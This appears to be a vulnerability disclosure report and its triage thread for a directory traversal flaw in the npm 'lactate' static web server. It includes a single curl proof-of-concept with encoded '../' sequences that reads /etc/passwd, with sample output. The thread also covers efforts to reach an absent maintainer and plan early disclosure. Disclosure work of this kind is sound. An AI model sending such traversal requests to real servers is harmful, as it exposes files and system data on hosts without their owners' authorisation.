title: [lactate] Static Web Server Directory Traversal via Crafted GET Request

profile.name: Node.js third-party modules
profile.about: This program is used to handle vulnerabilities in the Node.js ecosystem.

vulnerability_information:
Hi @vdeturckheim,

A crafted GET request can be leveraged to traverse the directory structure of a host using the `lactate` web server package, and request arbitrary files outside of the specified web root.

## Module specification
* **Name**: [lactate](https://www.npmjs.com/package/lactate)
* **Version**: 0.13.12 (latest release build)

## Verified conditions
* **Test server:** Ubuntu 16.04 LTS
* **cURL package**: `curl 7.55.1 (2017-08-14)`

I have not presently attempted to contact the maintainer and would appreciate assistance from Node.js Security in doing so, as described in the Disclosure Guidelines. This package has a considerably larger download count than those previously reported.

## Proof of concept

Please globally install the `lactate` package and `cd` to a chosen directory (in this case, `/root`) on your test server. Next, run `lactate  -p 8081` to start serving from this location.

Substituting the `<server-IP>` value as appropriate, the following cURL request can be used to demonstrate this vulnerability by requesting the target `/etc/passwd` file:

```
curl "http://<server-IP>:8081/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[...]
```

Thanks,

Yasin

## Impact

An adversary can leverage this vulnerability to request arbitrary files from the target host, which may include application source code or system configuration data.
vulnerability_information_html:
Hi @vdeturckheim,

A crafted GET request can be leveraged to traverse the directory structure of a host using the lactate web server package, and request arbitrary files outside of the specified web root.

Module specification

  • Name: lactate
  • Version: 0.13.12 (latest release build)

Verified conditions

  • Test server: Ubuntu 16.04 LTS
  • cURL package: curl 7.55.1 (2017-08-14)

I have not presently attempted to contact the maintainer and would appreciate assistance from Node.js Security in doing so, as described in the Disclosure Guidelines. This package has a considerably larger download count than those previously reported.

Proof of concept

Please globally install the lactate package and cd to a chosen directory (in this case, /root) on your test server. Next, run lactate -p 8081 to start serving from this location.

Substituting the <server-IP> value as appropriate, the following cURL request can be used to demonstrate this vulnerability by requesting the target /etc/passwd file:

curl "http://<server-IP>:8081/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[...]

Thanks,

Yasin

Impact

An adversary can leverage this vulnerability to request arbitrary files from the target host, which may include application source code or system configuration data.

activities.message:
Hey @ysx thanks for reporting this.

I'll be looking at it shortly. (btw, we are updating our quick response policy to be a bit more realistic https://github.com/nodejs/security-wg/pull/74/files )
activities.markdown_message:
Hey @ysx thanks for reporting this.

I'll be looking at it shortly. (btw, we are updating our quick response policy to be a bit more realistic https://github.com/nodejs/security-wg/pull/74/files )

activities.message:
I was able to reproduce the issue described and I consider this as a security issue.

@ysx I will triage this report as vulnerability. Have you already tried to contact the module maintainer?
activities.markdown_message:
I was able to reproduce the issue described and I consider this as a security issue.

@ysx I will triage this report as vulnerability. Have you already tried to contact the module maintainer?

activities.message: Thanks @vdeturckheim! I have not presently attempted to contact the maintainer and would appreciate assistance from Node.js Security in doing so.
activities.markdown_message: Thanks @vdeturckheim! I have not presently attempted to contact the maintainer and would appreciate assistance from Node.js Security in doing so.

activities.message:
The Github repository linked to this package is marked as "Unmaintained-Node-file-server". Since it has still a few npm download, I will still try to contact the maintainer.

ref. https://github.com/snowblindroan/-Unmaintained-Node-file-server
activities.markdown_message:
The Github repository linked to this package is marked as "Unmaintained-Node-file-server". Since it has still a few npm download, I will still try to contact the maintainer.

ref. https://github.com/snowblindroan/-Unmaintained-Node-file-server

activities.message: I could not find a way to contact the maintainer and issues are closed.
activities.markdown_message: I could not find a way to contact the maintainer and issues are closed.

activities.message:
Hi @vdeturckheim,

Thank you for attempting to contact the maintainer and investigating this further.

At this point, what would the best course of action be per the Disclosure Policy, please? (e.g. whether we should request a CVE and move to publicly disclose this report after a certain period).

Kind regards

Yasin

Yasin

activities.message: Hey @ysx . I'll try a bit harder to find the guy, otherwise, I'll ask for a vote by the team and you to know if we can go for an early disclosure.
activities.markdown_message: Hey @ysx . I'll try a bit harder to find the guy, otherwise, I'll ask for a vote by the team and you to know if we can go for an early disclosure.

activities.message: I have asked the triage team if they agree for an early disclosure of this one through the private Github Team.
